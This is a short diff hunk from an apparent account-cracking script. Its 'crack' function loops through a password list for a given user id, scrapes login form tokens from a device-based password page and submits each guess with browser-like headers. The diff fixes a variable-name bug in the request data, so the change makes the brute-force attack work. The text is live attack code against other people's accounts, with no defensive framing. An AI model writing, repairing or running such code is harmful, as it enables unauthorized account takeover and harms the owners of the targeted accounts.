@@ -657,7 +657,7 @@ def crack(idf,pwx,url,awal):
 		loop += 1
 		for pw in pwx:
 			link = ses.get(f'https://{url}/login/device-based/password/?uid='+idf+'&flow=fx_reauth')
-			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"uid":idf,"next":f"https://{URL}/login/save-device/","flow":"fx_reauth","pass":pw,}
+			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"uid":idf,"next":f"https://{url}/login/save-device/","flow":"fx_reauth","pass":pw}
 			hd2 = {'accept': '*/*',
 				'accept-encoding': 'gzip, deflate, br',
 				'accept-language': 'id,en-US;q=0.9,en;q=0.8',
